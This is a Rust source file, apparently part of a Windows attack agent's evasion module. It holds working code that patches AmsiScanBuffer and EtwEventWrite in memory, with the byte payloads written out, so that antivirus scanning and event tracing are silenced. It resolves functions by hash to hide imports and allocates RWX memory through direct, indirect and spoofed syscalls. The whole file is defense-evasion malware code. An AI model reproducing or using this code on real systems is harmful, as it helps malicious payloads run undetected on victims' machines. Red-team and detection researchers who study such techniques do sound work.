// AMSI / ETW patching — mirror of Go agent/internal/win/patch.go.
// Neutralises AmsiScanBuffer (return E_INVALIDARG) and EtwEventWrite (bare ret)
// using resolved exports (no IAT entries) and VirtualProtect.

#![cfg(target_os = "windows")]

use crate::evasion::pe::*;
use crate::evasion::ssn;
use crate::evasion::syscall;

/// Flips a region to RWX, writes payload, restores EXECUTE_READ.
/// Uses the API path (resolved VirtualProtect) to avoid syscall recursion.
pub unsafe fn patch_bytes(target: usize, payload: &[u8]) -> Result<(), String> {
    let k32 = module_kernel32();
    let vp = get_export(k32, hash_ansi("VirtualProtect"));
    if vp == 0 {
        return Err("VirtualProtect unresolved".into());
    }
    let mut old = 0u32;
    call_vp(vp, target, payload.len(), PAGE_EXECUTE_READWRITE, &mut old);
    std::ptr::copy_nonoverlapping(payload.as_ptr(), target as *mut u8, payload.len());
    let mut old2 = 0u32;
    call_vp(vp, target, payload.len(), PAGE_EXECUTE_READ, &mut old2);
    Ok(())
}

unsafe fn call_vp(vp: usize, addr: usize, size: usize, protect: u32, old: &mut u32) {
    let ret: usize;
    core::arch::asm!(
        "mov r10, rcx",
        "call {vp}",
        vp = in(reg) vp,
        in("rcx") addr,
        in("rdx") size,
        in("r8") protect as usize,
        in("r9") old as *mut u32 as usize,
        lateout("rax") ret,
        options(nostack)
    );
    let _ = ret;
}

/// NtProtectVirtualMemory via syscall layer (L4/L5/L7), used by alloc/protect.
pub fn protect_virtual_memory(mode: InvokeMode, addr: usize, size: usize, protect: u32) -> Result<u32, String> {
    unsafe {
        match mode {
            InvokeMode::Api => {
                let ntdll = module_ntdll();
                let proc = get_export(ntdll, hash_ansi("NtProtectVirtualMemory"));
                if proc == 0 {
                    return Err("NtProtectVirtualMemory unresolved".into());
                }
                let mut old = 0u32;
                let st = crate::evasion::ssn::call_api(proc, usize::MAX, &addr as *const _ as usize, &size as *const _ as usize, protect as usize, &mut old as *mut _ as usize, 0);
                if (st as i32) < 0 {
                    return Err(format!("NtProtectVirtualMemory: 0x{st:x}"));
                }
                Ok(old)
            }
            InvokeMode::Direct => {
                let e = ssn::ssn(ssn::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let mut old = 0u32;
                let st = syscall::direct_syscall5(e.ssn, usize::MAX, &addr as *const _ as usize, &size as *const _ as usize, protect as usize, &mut old as *mut _ as usize);
                if (st as i32) < 0 {
                    return Err(format!("protect: 0x{st:x}"));
                }
                Ok(old)
            }
            InvokeMode::Indirect => {
                let e = ssn::ssn(ssn::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let mut old = 0u32;
                let st = syscall::indirect_syscall5(e.gadget, e.ssn, usize::MAX, &addr as *const _ as usize, &size as *const _ as usize, protect as usize, &mut old as *mut _ as usize);
                if (st as i32) < 0 {
                    return Err(format!("protect: 0x{st:x}"));
                }
                Ok(old)
            }
            InvokeMode::Spoofed => {
                let e = ssn::ssn(ssn::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let mut old = 0u32;
                let st = syscall::spoofed_syscall5(e.ssn, usize::MAX, &addr as *const _ as usize, &size as *const _ as usize, protect as usize, &mut old as *mut _ as usize);
                if (st as i32) < 0 {
                    return Err(format!("protect: 0x{st:x}"));
                }
                Ok(old)
            }
        }
    }
}

#[derive(Clone, Copy, PartialEq)]
pub enum InvokeMode {
    Api,
    Direct,
    Indirect,
    Spoofed,
}

/// Allocate RWX memory via NtAllocateVirtualMemory through the chosen layer.
pub fn allocate_virtual_memory(mode: InvokeMode, size: usize, protect: u32) -> Result<usize, String> {
    unsafe {
        let mut base: usize = 0;
        let mut region_size = size;
        match mode {
            InvokeMode::Api => {
                let ntdll = module_ntdll();
                let proc = get_export(ntdll, hash_ansi("NtAllocateVirtualMemory"));
                if proc == 0 {
                    return Err("NtAllocateVirtualMemory unresolved".into());
                }
                let st = crate::evasion::ssn::call_api(proc, usize::MAX, &mut base as *mut _ as usize, &mut region_size as *mut _ as usize, 0x3000, protect as usize, 0);
                if (st as i32) < 0 {
                    return Err(format!("alloc: 0x{st:x}"));
                }
            }
            InvokeMode::Direct => {
                let e = ssn::ssn(ssn::HASH_NT_ALLOCATE_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let st = syscall::direct_syscall5(e.ssn, usize::MAX, &mut base as *mut _ as usize, &mut region_size as *mut _ as usize, 0x3000, protect as usize);
                if (st as i32) < 0 {
                    return Err(format!("alloc: 0x{st:x}"));
                }
            }
            InvokeMode::Indirect => {
                let e = ssn::ssn(ssn::HASH_NT_ALLOCATE_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let st = syscall::indirect_syscall5(e.gadget, e.ssn, usize::MAX, &mut base as *mut _ as usize, &mut region_size as *mut _ as usize, 0x3000, protect as usize);
                if (st as i32) < 0 {
                    return Err(format!("alloc: 0x{st:x}"));
                }
            }
            InvokeMode::Spoofed => {
                let e = ssn::ssn(ssn::HASH_NT_ALLOCATE_VIRTUAL_MEMORY).ok_or("SSN missing")?;
                let st = syscall::spoofed_syscall5(e.ssn, usize::MAX, &mut base as *mut _ as usize, &mut region_size as *mut _ as usize, 0x3000, protect as usize);
                if (st as i32) < 0 {
                    return Err(format!("alloc: 0x{st:x}"));
                }
            }
        }
        Ok(base)
    }
}

/// Patch amsi.dll!AmsiScanBuffer to return E_INVALIDARG immediately.
pub fn patch_amsi() -> Result<(), String> {
    unsafe {
        let h = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr() as *const u8);
        if h.is_null() {
            return Err("amsi.dll not loaded".into());
        }
        let amsi = h as usize;
        let target = get_export(amsi, hash_ansi("AmsiScanBuffer"));
        if target == 0 {
            return Err("AmsiScanBuffer unresolved".into());
        }
        // mov eax, 0x80070057; ret
        let payload = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        patch_bytes(target, &payload)
    }
}

/// Patch ntdll!EtwEventWrite to a bare ret.
pub fn patch_etw() -> Result<(), String> {
    unsafe {
        let ntdll = module_ntdll();
        if ntdll == 0 {
            return Err("ntdll not found".into());
        }
        let target = get_export(ntdll, hash_ansi("EtwEventWrite"));
        if target == 0 {
            return Err("EtwEventWrite unresolved".into());
        }
        // xor eax, eax; ret
        let payload = [0x31, 0xC0, 0xC3];
        patch_bytes(target, &payload)
    }
}

/// Patch EtwEventWrite and EtwEventWriteEx.
pub fn patch_etw_ex() -> Result<(), String> {
    patch_etw()?;
    unsafe {
        let ntdll = module_ntdll();
        if let Some(target) = non_zero(get_export(ntdll, hash_ansi("EtwEventWriteEx"))) {
            let _ = patch_bytes(target, &[0x31, 0xC0, 0xC3]);
        }
    }
    Ok(())
}

fn non_zero(x: usize) -> Option<usize> {
    if x == 0 {
        None
    } else {
        Some(x)
    }
}
